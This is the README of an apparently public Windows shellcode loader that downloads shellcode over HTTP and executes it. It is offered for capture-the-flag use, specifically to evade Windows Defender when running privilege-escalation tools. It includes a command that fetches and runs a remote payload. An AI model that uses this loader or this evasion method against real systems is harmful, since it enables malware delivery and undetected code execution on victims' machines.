## Credits :
Credits to @manesec because shellcode over http is his idea, check out [his repo](https://github.com/manesec/shellcodeloader4mane/).

## Why ?
You're doing a CTF, have SeImpersonatePrivilege but you get stuck for 3 hours because windows defender keeps deleting godpotato.exe ?
I'm here to save the day !

## Extreme loader
This is a really simple shellcode loader that can use two techniques :
- loadVirtualAlloc
- vectoredException

It will retrieve the shellcode via http to run it using one of the above techniques.

The second one is interesting because it's still kind of new. 
I wanted to make this when I found this good [blogpost](https://securityintelligence.com/x-force/using-veh-for-defense-evasion-process-injection/)
that goes into great detail on how it works.

This is a visual studio project, if you just want the executables I might add them to the release page if I'm not too lazy. 
I don't really plan on updating this while it works, but once it will get flagged by windows defender I might.
No encryption is used on the payload, feel free to fork and do it.

## How to use
You need to generate a shellcode from the executable you want to run, the best tool for this might be [donut](https://github.com/TheWover/donut).
Then just server the shellcode on http, and run
```
.\ExtremeLoader.exe http://10.10.10.10/loader.bin
```

Please please please be responsible and only use this in ctf's